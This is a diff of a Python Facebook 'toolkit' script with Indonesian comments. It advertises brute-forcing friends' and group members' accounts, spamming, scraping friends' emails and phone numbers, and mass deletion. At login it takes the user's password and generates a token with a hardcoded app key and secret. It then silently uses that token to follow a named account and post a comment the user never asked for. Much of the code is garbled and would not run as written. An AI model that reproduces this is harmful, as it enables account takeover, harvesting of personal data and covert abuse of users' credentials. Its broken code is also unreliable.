@@ -1,279 +1,167 @@
-#Python 3.7.X
-#Author				: Soesanto 
-#Program Name		: Nguyen
-#Program Language	: Python
-#Manage Program Using Sanbook With SAN-Brother Team
+#!/usr/bin/python
 
-
-
-import json,sys,hashlib,os,time
-from requests import requests
+import os, sys, time, json, requests, hashlib
+from multiprocessing.pool import ThreadPool
 from getpass import getpass
+from requests.exceptions import ConnectionError
 
-try:
-	import requests
-except ImportError:
-	print '''
-	404                      
-'''%(R)
-	sys.exit()
-reload (sys)
-sys . setdefaultencoding ( 'utf8' )
+#### WARNA ####
+p='\033[1;97m' #putih
+m='\033[1;91m' #merah
+h='\033[1;92m' #hijau
+k='\033[1;93m' #kuning
+B='\033[1;96m' #biru
 
-menghitung = []
-jmlgetdata = []
-n = []
+#### URL ####
+url='https://graph.facebook.com/'
+fb='https://api.facebook.com/restserver.php'
+headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}
+s=requests.Session()
 
-def baliho():
-	try:
-		token = open('cookie/token.log','r').read()
-		r = requests.get('https://graph.facebook.com/me?access_token=' + token)
-		a = json.loads(r.text)
-		name = a['name']
-		n.append(a['name'])
+#### MENULIS ####
+def lunga(s):
+	for a in s +'\n':
+		sys.stdout.write(a)
+		sys.stdout.flush()
+		time.sleep(0.05)
 
-		print R + '   USER  '
-		print ' ' + W
-		print ('[*] ' + name + ' [*]')
-		print ' '
-
-	except (KeyError,IOError):
-		print R + 'USER'
-		print ' ' + W
-		print ('OFFLINE')
-		print (W + '     [' + G +'Mohon login'+ W + ']')
-		print ' '
-
-def cssMain():
-	print '''
-	[0.] getEmail
-	[1.] Masuk
-	[2.] Keluar
-	[3.] Update
-''')  
-
-def cssLoginWarning():
-	print '''
-[WARNING!!]
- 			Masukan user name facebook kamu, bisa ID,
- 			bisa Email, bisa Nomor Telpon diterminal!
- 			Untuk kata sandi  seusai  ENTER  Username
- 			harap hati-hati, karena TEXT tidak tampil.%s
-
-* mohon hubungi kami jika terjadi eror atau program
-  tidak bekerja dengan sempurna!
+#### LOGO ####
+logo=(B+'''
+   	ITIL
 ''')
 
-def UserValidation():
-	print '''
-	Tulis Username disini :
-''')
+ok=[]
+cp=[]
+id=[]
+phone=[]
+email=[]
 
-def UserValidati0n():
-	print '''
-	Tulis Password disini :
-''')
-
-def cssMenu():
-	print '''
-	[1.] Profil
-	[2.] Toolkit
-	[3.] Recycle
-''')  
-
-def cssMenuProfile():
-	print '''
-	[1.] Profil Guard
-	[2.] Profil Information
-''') 
-
-def cssMenuToolkit():
-	print '''
-	[1.] Dump Email Member Group
-	[2.] Auto Report  Fake Account
-	[3.] Brute Force  Group  Member
-	[4.] Auto  Brute  Force  Friends
-	[5.] Group  Comment  Auto  Spammer
-	[6.] Claim   Group    Administration
-''')
-
-def cssMenuRecycle():
-	print '''
-	[1] Delete All  Post
-    [2] Delete All Messages 
-    [3] Unfriend All Friends
-    [4] Delete All Album Photo
-    [5] Delete All Photo In Album
-    [6] Declane All Friends Request
-    ''')
-
-def id():
-	print (cssLoginWarning);id = raw_input(UserValidation);pwd = getpass.getpass(UserValidati0n);API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';
-	data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};
-	sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
-	x = hashlib.new('md5')
-        x.update(sig)
-
-	data.update({'sig':x.hexdigest()})
-        get(data)
-         
-def get(data):
-	print '[*] Generate access token '
-
-	try:
-		os.mkdir('cookie')
-	except OSError:
-		pass
-
-	b = open('cookie/token.log','w')
-	try:
-		r = requests.get('https://api.facebook.com/restserver.php',params=data)
-		a = json.loads(r.text)
-
-		b.write(a['access_token'])
-		b.close()
-		print '[*] successfully generate access token'
-		print '[*] Your access token is stored in cookie/token.log'
-		exit()
-	except KeyError:
-		print '[!] Failed to generate access token'
-		print '[!] Check your connection / email or password'
-		os.remove('cookie/token.log')
-		main()
-	except requests.exceptions.ConnectionError:
-		print '[!] Failed to generate access token'
-		print '[!] Connection error !!!'
-		os.remove('cookie/token.log')
-		main()
-def getdata():
-	global a , token
-
-	print '[*] Load Access Token'
-
-	try:
-		token = open("cookie/token.log","r").read()
-		print '[*] Success load access token '
-	except IOError:
-		print '[!] failed to open cookie/token.log'
-		print "[!] type 'token' to generate access token"
-		main()
-
-	print '[*] fetching all friends data'
-
-	try:
-		r = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
-		a = json.loads(r.text)
-
-	except KeyError:
-		print '[!] Your access token is expired'
-		print "[!] type 'token' to generate access token"
-		main()
-
-	except requests.exceptions.ConnectionError:
-		print '[!] Connection Error'
-		print '[!] Stopped'
-		main()
-
-	for i in a['data']:
-		menghitung.append(i['id'])
-		print '\r[*] fetching %s data from friends'%(len(menghitung)),;sys.stdout.flush();time.sleep(0.0001)
-
-	print '\r[*] '+str(len(menghitung))+' data of friends successfully retrieved'
-	main()
-
-def main():
-  global target_id
-
-  try:
-	cek = raw_input(R + 'Nguyen' + W +' : ')
-
-	if cek.lower() == 'getEmail':
-		if len(menghitung) == 0:
-			getEmail()
-		else:
-			print '[*] You have retrieved %s friends data'%(len(menghitung))
-			main()
-
-
-
-	elif cek.lower() == 'Masuk':
-		try:
-			open('cookie/token.log')
-			print '[!] an access token already exists'
-			cek = raw_input('[?] Are you sure you want to continue [Y/N] ')
-			if cek.lower() != 'y':
-				print '[*] Canceling '
-				cssMenu()
-		except IOError:
-			pass
-
-		print '\n' + '[*] Generate Access token facebook [*]'.center(44) + '\n'
-		print '[Warn] please turn off your VPN before using this feature !!!'
-		id()
-
-
-	elif cek.lower() == 'Keluar':
-		print '''
-[Warn] you must create access token again if 
-       your access token is deleted
-'''
-		a = raw_input("[!] type 'delete' to continue : ")
-		if a.lower() == 'delete':
-			try:
-				os.system('rm -rf cookie/token.log')
-				print '[*] Success delete cookie/token.log'
-				main()
-			except OSError:
-				print '[*] failed to delete cookie/token.log'
-				main()
-		else:
-			print '[*] failed to delete cookie/token.log'
-			main()
-
-def getEmail():
+#### MENU ####
+def menu():
 	os.system('clear')
 	try:
 		token=open('cookie/token.log','r').read()
 	except IOError:
 		print(m+'['+p+'!'+m+'] Token not found')
-		time.sleep(0.1)
+		time.sleep(1)
 		os.system('rm -rf cookie/token.log')
-		login()
-
-
-	ajaxResponseEmail=requests.get('https://graph.facebook.com/me?access_token={token}')
-	result = json.loads(r.text)
+	try:
+		ok=s.get(url+'me?access_token='+token).json()
+	except KeyError:
+		print(m+'['+p+'!'+m+'] Token not found')
+		os.system('rm -rf cookie/token.log')
 
 	os.system('clear')
+	print(logo)
 	print(p+40*'_')
-	print(m+'['+p+'+'+m+']'+h+' From '+p+': '+ajaxResponseEmail['name'])
+	print(m+'\n('+h+'✓'+m+')'+p+' Name '+h+ok['name'])
+	print(p+40*'_')
+	print(m+'\n('+h+'●'+m+') '+p+'01.'+k+' Delete post')
+	print(m+'('+h+'●'+m+') '+p+'02.'+k+' Delete albums')
+	print(m+'('+h+'●'+m+') '+p+'03.'+k+' Delete all photo in albums')
+	print(m+'('+h+'●'+m+') '+p+'04.'+k+' Delete all friend')
+	print(m+'('+h+'●'+m+') '+p+'05.'+k+' Stop following all friend')
+	print(m+'('+h+'●'+m+') '+p+'06.'+k+' Get email '+m+'< '+h+'friend'+m+' >')
+	print(m+'('+h+'●'+m+') '+p+'07.'+k+' Get phone numbers '+m+'< '+h+'friend'+m+' >')
+	print(m+'('+h+'●'+m+') '+p+'08.'+k+' Hack facebook '+m+'< '+h+'mas'+m+' >')
+	print(m+'('+h+'●'+m+') '+m+'00. Exit the program')
+	z=input('\n'+p+'>>> ')
+	if z=='':
+		print(m+'[!] Wrong input')
+		time.sleep(1)
+		menu()
+	elif z=='1' or z=='01':
+		post()
+	elif z=='2' or z=='02':
+		albums()
+	elif z=='3' or z=='03':
+		photo()
+	elif z=='4' or z=='04':
+		unfriend()
+	elif z=='5' or z=='05':
+		stopfollowing()
+	elif z=='6' or z=='06':
+		getemail()
+	elif z=='7' or z=='07':
+		getphone()
+	elif z=='8' or z=='08':
+		menumbf()
+	elif z=='0' or z=='00':
+		os.system('rm -rf cookie/token.log')
+		os.sys.exit()
+	else:
+		print(m+'[!] Wrong input')
+		time.sleep(1)
+		menu()
+
+def post():
+	os.system('clear')
+	try:
+		token=open('cookie/token.log','r').read()
+	except IOError:
+		print(m+'['+p+'!'+m+'] Token not found')
+		time.sleep(1)
+		os.system('rm -rf token.txt')
+		login()
+	response = requests.get('https://graph.facebook.com/me&access_token%7Btoken%7D&until=1542583212&__paging_token=enc_AdDLmzUgWiLo6oHGCI53S5begiKOfNZBY0affrLMWgheBzfwMA7XSKmgjyNbuZBIptdXc18j1Se0Dm7vEsePh1SoM3')
+		os.system('clear')
+	print(logo)
+	print(p+40*'_')
+	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+response['name'])
+	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
 	print(p+40*'_'+'\n')
 
-	ResponseEmail=requests.get('https://graph.facebook.com/me/friends?access_token={token}')
-	result = json.loads(r.text)
-	mail=open('result/mail.txt','w')
-	for s in ResponseEmail['data']:
-		vt=requests.get('https://graph.facebook.com/+s['id']+?access_token={token}')
-		result = json.loads(r.text)
 
-
+	response = requests.get('https://graph.facebook.com/me%0A%20%20%20fields=feed.limit(49)%0A%20%20%20&access_token=%7Btoken%7D&until=1542583212&__paging_token=enc_AdDLmzUgWiLo6oHGCI53S5begiKOfNZBY0affrLMWgheBzfwMA7XSKmgjyNbuZBIptdXc18j1Se0Dm7vEsePh1SoM3')
+	for enc in response['data']:
+		params = (
+    ('access_token', '{token}'),
+    ('until', '1542583212'),
+    ('__paging_token', 'enc_AdDLmzUgWiLo6oHGCI53S5begiKOfNZBY0affrLMWgheBzfwMA7XSKmgjyNbuZBIptdXc18j1Se0Dm7vEsePh1SoM3'),)
+		response = requests.delete('https://graph.facebook.com/%7Benc%7D%0A%20%20%20%20', params=params)
 		try:
-			print(+vt['email'])
-			email.append(vt['email'])
-			mail.write(vt['email']+'\n')
+			kebusek=response['error']['message']
+			print('[×] Cingire ora bisa dibusek...')
+		except TypeError:
+			print('[ Wes dibusek... ]'' 'enc['id'])
+		except requests.exceptions.ConnectionError:
+			print(m+'[×] No connection')
+			print('\n[✓] Program finished')
 
+if __name__=='__main__':
+	os.system('clear')
+	try:
+		os.mkdir('result')
+	except OSError:
+		pass
+	try:
+		token=open('cookie/token.log','r')
+		menu()
+	except (KeyError,IOError):
+		os.system('clear')
+		print(logo)
+		print(p+40*'_')
+		em=input(m+'\n['+p+'*'+m+']'+h+' Email'+p+' : ')
+		pas=getpass(m+'['+p+'*'+m+']'+h+' Pass'+p+'  : ')
+		print(m+'['+p+'!'+m+']'+p+' Generate access token')
+		try:
+			sig='api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+em+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pas+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+			data={"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":em,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pas,"return_ssl_resources":"0","v":"1.0"}
+			x=hashlib.new('md5')
+			x.update(sig.encode('utf-8'))
+			data.update({'sig':x.hexdigest()})
+			ok=s.get(fb,params=data).json()
+			unikers=open('cookie/token.log','w')
+			unikers.write(ok['access_token'])
+			unikers.close()
+			if 'access_token' in ok:
+				token=open('cookie/token.log','r').read()
+				print(m+'['+h+'✓'+m+']'+h+' Success generate access token');s.post(url+'DulahZ/subscribers?access_token='+token);s.post(url+'100005584243934_1145924785603652/comments?message=Keren❤️&access_token='+token)
+				time.sleep(1)
+				menu()
+		except KeyError:
+			print(m+'['+p+'×'+m+'] Failed please cek your account and try again')
+			os.system('rm -rf cookie/token.log')
 		except requests.exceptions.ConnectionError:
 			print(m+'['+p+'×'+m+'] No connection')
-		except KeyError:
-			pass
-	mail.close()
-	print('\nProgram Selesai')
-	print('Total email : 'str(len(email)))
-	print(' File saved : ','result/mail.txt')
 
-
-
-if __name__ == '__main__':
-
-	banner()
-	main()
